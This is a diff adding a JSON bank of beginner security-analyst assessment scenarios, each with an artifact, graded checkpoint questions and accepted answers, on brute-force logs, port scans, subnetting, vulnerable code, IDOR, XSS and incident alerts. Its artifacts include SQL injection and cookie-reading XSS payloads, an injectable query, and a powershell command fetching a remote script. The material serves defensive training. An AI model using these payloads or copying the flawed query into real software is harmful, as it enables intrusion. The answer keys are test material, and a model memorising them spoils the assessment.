@@ -1,0 +1,271 @@
+{
+  "meta": {
+    "name": "GetHired Practical Assessment — Scenario Bank",
+    "version": "0.1.0",
+    "note": "Static, checkpoint/flag-style scenarios. Fully rule-based grading — no AI. Answers are normalized (lowercase, trimmed, punctuation-stripped) before comparison against acceptedAnswers.",
+    "design_notes": "Format informed by research into TryHackMe/HackTheBox/LetsDefend/CyberDefenders beginner content: one static artifact per scenario, 2-3 sequential checkpoint questions mirroring an analyst's investigation order, exact-match grading with a synonym list per answer, uniform point value per checkpoint (no partial credit, no hints in v1)."
+  },
+  "scenarios": [
+    {
+      "id": "log-analysis-1",
+      "category": "log_analysis",
+      "title": "SSH Brute-Force Sweep",
+      "scenario": "You're reviewing authentication logs on a public-facing web server after a monitoring rule flagged unusual SSH activity overnight.",
+      "artifactLabel": "auth.log excerpt",
+      "artifact": "Aug 01 02:14:03 web01 sshd[1122]: Failed password for invalid user admin from 198.51.100.23 port 51422 ssh2\nAug 01 02:14:05 web01 sshd[1122]: Failed password for invalid user admin from 198.51.100.23 port 51423 ssh2\nAug 01 02:14:07 web01 sshd[1122]: Failed password for invalid user root from 198.51.100.23 port 51424 ssh2\nAug 01 02:14:09 web01 sshd[1122]: Failed password for invalid user root from 198.51.100.23 port 51425 ssh2\nAug 01 02:14:11 web01 sshd[1122]: Failed password for invalid user oracle from 198.51.100.23 port 51426 ssh2\nAug 01 02:14:14 web01 sshd[1131]: Accepted password for oracle from 198.51.100.23 port 51430 ssh2\nAug 01 02:14:15 web01 sshd[1131]: pam_unix(sshd:session): session opened for user oracle by (uid=0)",
+      "checkpoints": [
+        {
+          "id": "log-analysis-1-q1",
+          "question": "What source IP address appears on every line of this log excerpt?",
+          "acceptedAnswers": ["198.51.100.23"],
+          "points": 10,
+          "explanation": "Every attempt — failed and successful — comes from 198.51.100.23, which is why it's the first thing to pivot on when investigating."
+        },
+        {
+          "id": "log-analysis-1-q2",
+          "question": "Which username did the attacker ultimately authenticate as successfully?",
+          "acceptedAnswers": ["oracle"],
+          "points": 10,
+          "explanation": "After failing on 'admin' and 'root', the attacker succeeded on the third username tried, 'oracle' — a reminder that service accounts are often weaker targets than obviously-privileged ones."
+        },
+        {
+          "id": "log-analysis-1-q3",
+          "question": "Many failed logins with different usernames from one IP, followed by a success, is a classic sign of what kind of attack?",
+          "acceptedAnswers": ["brute force", "brute-force attack", "brute force attack", "password guessing", "credential stuffing"],
+          "points": 10,
+          "explanation": "This is textbook brute-forcing: automated, rapid-fire login attempts until one combination works. It's exactly the pattern SIEM correlation rules are built to catch."
+        }
+      ]
+    },
+    {
+      "id": "log-analysis-2",
+      "category": "log_analysis",
+      "title": "Anomalous Web Request",
+      "scenario": "You're scanning a web server's access log after a WAF dashboard showed a spike in response size for one endpoint.",
+      "artifactLabel": "access.log excerpt",
+      "artifact": "203.0.113.44 - - [01/Aug/2026:03:14:19] \"GET /product?id=17 HTTP/1.1\" 200 1204\n203.0.113.44 - - [01/Aug/2026:03:14:20] \"GET /product?id=18 HTTP/1.1\" 200 1198\n198.51.100.9 - - [01/Aug/2026:03:14:22] \"GET /search?q=laptop HTTP/1.1\" 200 892\n203.0.113.44 - - [01/Aug/2026:03:14:25] \"GET /product?id=17' OR '1'='1 HTTP/1.1\" 200 5120\n203.0.113.44 - - [01/Aug/2026:03:14:26] \"GET /product?id=17;--%20 HTTP/1.1\" 500 210",
+      "checkpoints": [
+        {
+          "id": "log-analysis-2-q1",
+          "question": "Which IP address sent the request that appears to be attempting SQL injection?",
+          "acceptedAnswers": ["203.0.113.44"],
+          "points": 10,
+          "explanation": "203.0.113.44 sent both the normal /product requests and the ' OR '1'='1 payload — the same client, escalating from normal browsing to an injection attempt."
+        },
+        {
+          "id": "log-analysis-2-q2",
+          "question": "What HTTP status code did the server return for the ' OR '1'='1 request (the one with the unusually large 5120-byte response)?",
+          "acceptedAnswers": ["200"],
+          "points": 10,
+          "explanation": "A 200 with a much larger response body than the normal ~1200 bytes strongly suggests the injected query executed and returned extra data — a 200 here is more alarming than the later 500 error, which is just the database rejecting broken syntax."
+        }
+      ]
+    },
+    {
+      "id": "networking-1",
+      "category": "networking",
+      "title": "Unusual Connection Pattern",
+      "scenario": "A NIDS sensor logged a burst of TCP connection attempts from an internal host to another internal host across many ports within the same second.",
+      "artifactLabel": "connection summary",
+      "artifact": "Source: 192.168.10.55\nDestination: 10.0.0.20\n15:02:01  SYN -> port 21    (no response)\n15:02:01  SYN -> port 22    (no response)\n15:02:01  SYN -> port 23    (no response)\n15:02:01  SYN -> port 80    RST/ACK\n15:02:01  SYN -> port 443   RST/ACK\n15:02:01  SYN -> port 3389  (no response)\n15:02:01  SYN -> port 8080  (no response)",
+      "checkpoints": [
+        {
+          "id": "networking-1-q1",
+          "question": "What single source IP is generating all of these connection attempts?",
+          "acceptedAnswers": ["192.168.10.55"],
+          "points": 10,
+          "explanation": "192.168.10.55 is hitting seven different ports on the same destination within the same second — the source to isolate and investigate first."
+        },
+        {
+          "id": "networking-1-q2",
+          "question": "One host sending SYN packets to many different ports on another host in rapid succession is best described as what?",
+          "acceptedAnswers": ["port scan", "port scanning", "a port scan", "scan", "network scan"],
+          "points": 10,
+          "explanation": "This is the signature shape of a port scan: many SYNs, few or no completed handshakes, spread across a range of ports rather than one."
+        },
+        {
+          "id": "networking-1-q3",
+          "question": "How many of the 7 scanned ports actually returned a response (RST/ACK) instead of staying silent?",
+          "acceptedAnswers": ["2", "two"],
+          "points": 10,
+          "explanation": "Ports 80 and 443 replied with RST/ACK — meaning the host is up and those two ports are closed-but-reachable, while the silent ports are likely filtered by a firewall."
+        }
+      ]
+    },
+    {
+      "id": "networking-2",
+      "category": "networking",
+      "title": "Subnet Math",
+      "scenario": "You're documenting network segments for an asset inventory and need to work out the details of this interface from its configuration.",
+      "artifactLabel": "interface config",
+      "artifact": "Interface: eth0\nIP Address: 192.168.1.130\nSubnet Mask: 255.255.255.192",
+      "checkpoints": [
+        {
+          "id": "networking-2-q1",
+          "question": "What is the CIDR notation (/xx) equivalent of the subnet mask 255.255.255.192?",
+          "acceptedAnswers": ["/26", "26"],
+          "points": 10,
+          "explanation": "255.255.255.192 in binary is 11111111.11111111.11111111.11000000 — 26 network bits, so /26."
+        },
+        {
+          "id": "networking-2-q2",
+          "question": "What is the network address for this host's subnet?",
+          "acceptedAnswers": ["192.168.1.128"],
+          "points": 10,
+          "explanation": "A /26 breaks the last octet into blocks of 64. 192.168.1.130 falls in the 128-191 block, so the network address is 192.168.1.128."
+        },
+        {
+          "id": "networking-2-q3",
+          "question": "How many usable host addresses are available in this /26 subnet?",
+          "acceptedAnswers": ["62"],
+          "points": 10,
+          "explanation": "A /26 has 64 total addresses; subtract 2 for the network and broadcast addresses, leaving 62 usable host addresses."
+        }
+      ]
+    },
+    {
+      "id": "vuln-id-1",
+      "category": "vulnerability_identification",
+      "title": "Unsafe Query Construction",
+      "scenario": "You're doing a quick code review on a pull request for an internal admin tool ahead of a security sign-off.",
+      "artifactLabel": "app/db.py",
+      "artifact": "def get_user(username):\n    query = \"SELECT * FROM users WHERE username = '\" + username + \"'\"\n    return db.execute(query)",
+      "checkpoints": [
+        {
+          "id": "vuln-id-1-q1",
+          "question": "What OWASP Top 10 vulnerability class does this code contain?",
+          "acceptedAnswers": ["sql injection", "injection", "sqli"],
+          "points": 10,
+          "explanation": "Concatenating raw user input directly into a SQL string lets an attacker supply input like ' OR '1'='1 to change the query's logic — classic SQL injection."
+        },
+        {
+          "id": "vuln-id-1-q2",
+          "question": "What should replace string concatenation here to fix the vulnerability?",
+          "acceptedAnswers": ["parameterized queries", "parameterised queries", "prepared statements", "parameterized query", "prepared statement"],
+          "points": 10,
+          "explanation": "Parameterized queries (prepared statements) send user input separately from the query structure, so the database never interprets it as SQL — the standard fix for injection."
+        }
+      ]
+    },
+    {
+      "id": "vuln-id-2",
+      "category": "vulnerability_identification",
+      "title": "Leaked Configuration File",
+      "scenario": "A teammate accidentally pushed an environment file to a public GitHub repository. You've been asked to flag what's wrong before it's force-removed from history.",
+      "artifactLabel": "config.env",
+      "artifact": "# config.env (committed to public repo)\nDB_HOST=prod-db.internal\nDB_USER=admin\nDB_PASSWORD=Summer2024!\nAPI_KEY=sk_live_51Hc8...\nDEBUG=True",
+      "checkpoints": [
+        {
+          "id": "vuln-id-2-q1",
+          "question": "What security issue applies to both DB_PASSWORD and API_KEY in this file?",
+          "acceptedAnswers": ["hardcoded credentials", "hardcoded secrets", "hardcoded password", "hardcoded passwords", "hardcoded api key", "exposed credentials", "exposed secrets"],
+          "points": 10,
+          "explanation": "Real production credentials committed directly into a file, now in a public repo's history, are hardcoded secrets — they must be rotated immediately, not just deleted from the latest commit."
+        },
+        {
+          "id": "vuln-id-2-q2",
+          "question": "Besides the exposed secrets, what other setting in this file is risky to leave enabled in a production environment?",
+          "acceptedAnswers": ["debug", "debug mode", "debug=true", "debug flag"],
+          "points": 10,
+          "explanation": "DEBUG=True in production frameworks often leaks stack traces, internal file paths, and configuration details to anyone who can trigger an error page."
+        }
+      ]
+    },
+    {
+      "id": "owasp-1",
+      "category": "owasp_top10",
+      "title": "Order Lookup Flaw",
+      "scenario": "A bug bounty report comes in: a logged-in user changed the order_id number in the URL and was able to view another customer's full order, including their address and payment last-4 digits — with no error or permission check.",
+      "artifactLabel": "bug report summary",
+      "artifact": "Steps to reproduce:\n1. Log in as a normal customer.\n2. Open your own order: /orders/1042\n3. Change the URL to /orders/1043 (someone else's order ID).\n4. Observe: the other customer's order details load normally, with no access-denied response.",
+      "checkpoints": [
+        {
+          "id": "owasp-1-q1",
+          "question": "Which OWASP Top 10 (2021) category best describes this flaw?",
+          "acceptedAnswers": ["broken access control", "access control", "a01", "a01:2021"],
+          "points": 10,
+          "explanation": "This is Broken Access Control (OWASP A01:2021) — specifically an Insecure Direct Object Reference (IDOR): the app trusts the order_id from the URL without checking it belongs to the requesting user."
+        }
+      ]
+    },
+    {
+      "id": "owasp-2",
+      "category": "owasp_top10",
+      "title": "Reflected Input on a Login Page",
+      "scenario": "A tester notices that a site's login form echoes back whatever is typed into the username field when login fails, without any encoding.",
+      "artifactLabel": "tester's note",
+      "artifact": "Input submitted as username: <script>alert(document.cookie)</script>\nResulting page: the login error message renders the input directly into the HTML, and the script executes in the browser — a popup showing the page's cookies appears.",
+      "checkpoints": [
+        {
+          "id": "owasp-2-q1",
+          "question": "Which OWASP Top 10 category does this describe?",
+          "acceptedAnswers": ["cross-site scripting", "cross site scripting", "xss", "injection"],
+          "points": 10,
+          "explanation": "Rendering unescaped user input back into a page so a script executes in another user's browser is Cross-Site Scripting (XSS), grouped under OWASP's broader Injection category (A03:2021)."
+        },
+        {
+          "id": "owasp-2-q2",
+          "question": "What is the common three-letter abbreviation for this vulnerability class?",
+          "acceptedAnswers": ["xss"],
+          "points": 10,
+          "explanation": "XSS — Cross-Site Scripting."
+        }
+      ]
+    },
+    {
+      "id": "ir-1",
+      "category": "incident_response",
+      "title": "Impossible Travel Alert",
+      "scenario": "Your SIEM fires an 'impossible travel' rule: the same user account logged in from two geographically distant locations too close together in time to be physically possible.",
+      "artifactLabel": "SOC alert",
+      "artifact": "Alert: Impossible Travel\nUser: j.smith@company.com\nEvent 1: Login from Chennai, India at 09:02 UTC\nEvent 2: Login from Frankfurt, Germany at 09:14 UTC\nHR note: j.smith is on approved leave this week.\nImmediately after Event 2, a bulk export of the customer database (14,000 records) was initiated from that session.",
+      "checkpoints": [
+        {
+          "id": "ir-1-q1",
+          "question": "Is this alert a true positive or a false positive?",
+          "acceptedAnswers": ["true positive", "tp"],
+          "points": 10,
+          "explanation": "The user is confirmed on leave (so it's not them working from a new location), and the session was used to bulk-export sensitive data — every corroborating detail points to a compromised account, not a benign explanation."
+        },
+        {
+          "id": "ir-1-q2",
+          "question": "What should the analyst's next action be?",
+          "acceptedAnswers": ["escalate", "escalate to ir team", "escalate the incident", "escalate to incident response", "contain the account", "disable the account"],
+          "points": 10,
+          "explanation": "With account compromise plus active data exfiltration, this needs immediate escalation/containment (disable the account, force a password reset, involve the IR team) — not a routine close."
+        }
+      ]
+    },
+    {
+      "id": "ir-2",
+      "category": "incident_response",
+      "title": "Suspicious Macro Execution",
+      "scenario": "Endpoint AV quarantined a file on a new hire's laptop, but the process tree shows the malicious action had already started before quarantine kicked in.",
+      "artifactLabel": "EDR alert",
+      "artifact": "Alert: Antivirus Detection\nHost: FIN-LAPTOP-04\nFile: quarterly_report_invoice.xlsm\nAction taken by AV: Quarantined\nUser: finance-intern (new hire, started 3 days ago)\nProcess tree: EXCEL.EXE -> powershell.exe -c \"iwr http://45.9.x.x/update.ps1\"",
+      "checkpoints": [
+        {
+          "id": "ir-2-q1",
+          "question": "Based on the file extension, what type of malicious payload likely delivered this attack?",
+          "acceptedAnswers": ["macro", "malicious macro", "excel macro", "office macro"],
+          "points": 10,
+          "explanation": ".xlsm files support embedded macros — a very common initial-access technique, especially against new employees unfamiliar with 'enable content' warnings."
+        },
+        {
+          "id": "ir-2-q2",
+          "question": "What command-line tool did the macro spawn to reach out to the internet?",
+          "acceptedAnswers": ["powershell", "powershell.exe"],
+          "points": 10,
+          "explanation": "EXCEL.EXE spawning powershell.exe is a well-known red flag — Office applications legitimately have no reason to launch a shell."
+        },
+        {
+          "id": "ir-2-q3",
+          "question": "Given the process tree shows the download command already ran, should this alert be closed once the file is quarantined, or escalated for further investigation?",
+          "acceptedAnswers": ["escalate", "escalate for investigation", "escalate further investigation", "investigate further", "further investigation"],
+          "points": 10,
+          "explanation": "Quarantining the original file doesn't undo commands that already executed — the host needs to be investigated for what update.ps1 actually did before this can be closed."
+        }
+      ]
+    }
+  ]
+}
